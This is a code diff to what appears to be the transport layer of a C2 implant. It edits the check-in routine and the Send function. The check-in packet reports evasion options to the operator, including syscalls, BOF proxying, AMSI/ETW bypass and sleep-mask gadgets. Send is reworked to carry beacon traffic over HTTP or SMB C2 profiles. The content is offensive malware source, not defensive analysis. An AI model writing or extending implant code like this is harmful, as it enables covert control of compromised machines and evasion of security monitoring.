@@ -41,7 +41,7 @@ auto DECLFN Transport::Checkin(
 
     // some evasion features enable informations
     Self->Pkg->Int32( CheckinPkg, Self->Config.Syscall );
-    Self->Pkg->Int32( CheckinPkg, Self->Config.BofHook );
+    Self->Pkg->Int32( CheckinPkg, Self->Config.BofProxy );
     Self->Pkg->Int32( CheckinPkg, Self->Config.AmsiEtwBypass );
 
     // killdate informations
@@ -67,7 +67,7 @@ auto DECLFN Transport::Checkin(
     // mask informations
     Self->Pkg->Int64( CheckinPkg, Self->Config.Mask.JmpGadget );  
     Self->Pkg->Int64( CheckinPkg, Self->Config.Mask.NtContinueGadget );  
-    Self->Pkg->Int32( CheckinPkg, Self->Config.Mask.TechniqueID );  
+    Self->Pkg->Int32( CheckinPkg, Self->Config.Mask.Beacon );  
 
     // process context informations
     Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.ParentID );
@@ -120,8 +120,6 @@ auto DECLFN Transport::Checkin(
     //
     if ( ( NewUUID && Str::CompareA( NewUUID, Self->Session.AgentID ) != 0 ) ) {
         Self->Session.Connected = TRUE;
-    } else {
-
     }
 
     KhDbg( "set uuid: %s", Self->Session.AgentID );
@@ -134,19 +132,17 @@ auto DECLFN Transport::Checkin(
 }
 
 auto Transport::Send(
-    _In_      PVOID   Data,
-    _In_      UINT64  Size,
-    _Out_opt_ PVOID  *RecvData,
-    _Out_opt_ UINT64 *RecvSize
+    _In_      MM_INFO* SendData,
+    _Out_opt_ MM_INFO* RecvData
 ) -> BOOL {
-#if PROFILE_C2 == PROFILE_WEB
-    return Self->Tsp->WebSend(
-        Data, Size, RecvData, RecvSize
+#if PROFILE_C2 == PROFILE_HTTP
+    return Self->Tsp->HttpSend(
+        SendData, RecvData
     );
 #endif
 #if PROFILE_C2 == PROFILE_SMB
     return Self->Tsp->SmbSend(
-        Data, Size, RecvData, RecvSize
+        SendData, RecvData
     );
 #endif
 }
